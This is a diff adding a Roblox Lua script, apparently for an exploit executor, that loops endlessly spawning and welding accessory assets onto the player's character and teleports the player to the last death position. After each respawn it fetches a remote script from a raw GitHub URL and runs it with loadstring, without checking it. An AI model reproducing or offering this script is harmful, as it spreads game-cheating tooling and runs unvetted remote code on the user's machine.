@@ -1,0 +1,115 @@
+-- Set global time for accessory loading
+getgenv().Time = 0.3  -- Set the time to 0.3
+
+-- Define accessory IDs for the head and torso
+getgenv().Head = { 8484756013, 8484756013 }
+getgenv().Torso = { 8484756013, 8484758961 }
+
+local lastDeathPosition = nil  -- Store last death position
+
+-- Anti-double execution setup for loadstring
+_G.loadStringCooldown = 5 -- seconds
+_G.lastLoadStringTime = 0
+
+-- Function to weld parts together for accessories
+local function weldParts(part0, part1, c0, c1)
+    local weld = Instance.new("Weld")
+    weld.Part0 = part0
+    weld.Part1 = part1
+    weld.C0 = c0
+    weld.C1 = c1
+    weld.Parent = part0
+    return weld
+end
+
+-- Function to find an attachment in the part's descendants
+local function findAttachment(rootPart, name)
+    for _, descendant in pairs(rootPart:GetDescendants()) do
+        if descendant:IsA("Attachment") and descendant.Name == name then
+            return descendant
+        end
+    end
+end
+
+-- Function to add accessories to the character
+local function addAccessoryToCharacter(accessoryId, parentPart)
+    -- Load the accessory from the asset ID
+    local accessory = game:GetObjects("rbxassetid://" .. tostring(accessoryId))[1]
+    accessory.Parent = game.Workspace
+
+    -- Find the handle of the accessory and ensure it's colliding
+    local handle = accessory:FindFirstChild("Handle")
+    if handle then
+        handle.CanCollide = false
+        -- Check if there's an attachment and weld it
+        local attachment = handle:FindFirstChildOfClass("Attachment")
+        if attachment then
+            local parentAttachment = findAttachment(parentPart, attachment.Name)
+            if parentAttachment then
+                weldParts(parentPart, handle, parentAttachment.CFrame, attachment.CFrame)
+            end
+        end
+    end
+
+    -- Parent the accessory back to the character
+    accessory.Parent = game.Players.LocalPlayer.Character
+end
+
+-- Function to execute the loadstring once per cooldown period
+local function executeLoadstringOnce()
+    local currentTime = tick()
+    if currentTime - _G.lastLoadStringTime >= _G.loadStringCooldown then
+        _G.lastLoadStringTime = currentTime
+        -- Load and execute the external script from the URL
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Nwepnet/Skibidi/refs/heads/main/protectgojo1-1.txt", true))()
+    end
+end
+
+-- Function executed when the player's character respawns
+local function onCharacterAdded(character)
+    wait(getgenv().Time)  -- Wait for a short time before starting the accessory spam
+
+    -- Start accessory spam loop in a separate thread to avoid blocking the rest of the code
+    spawn(function()
+        while true do
+            -- Add head accessories
+            for _, accessoryId in ipairs(getgenv().Head) do
+                addAccessoryToCharacter(accessoryId, character.Head)
+            end
+
+            -- Add torso accessories
+            for _, accessoryId in ipairs(getgenv().Torso) do
+                addAccessoryToCharacter(accessoryId, character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso"))
+            end
+
+            wait(0.5)  -- Wait for 0.5 seconds before adding accessories again
+        end
+    end)
+
+    -- Set death position if available
+    if lastDeathPosition then
+        character:SetPrimaryPartCFrame(CFrame.new(lastDeathPosition))
+    end
+
+    -- Wait 3 seconds before executing the loadstring
+    wait(3)
+    executeLoadstringOnce()  -- Execute the loadstring after waiting 3 seconds
+end
+
+-- Function to store the last death position
+local function onPlayerDied()
+    local character = game.Players.LocalPlayer.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        -- Save the death position when the player dies
+        lastDeathPosition = character.HumanoidRootPart.Position
+    end
+end
+
+-- Connect the onCharacterAdded function to respawn events
+game.Players.LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
+if game.Players.LocalPlayer.Character then
+    onCharacterAdded(game.Players.LocalPlayer.Character)
+end
+
+-- Listen for player death to record position
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(onPlayerDied)
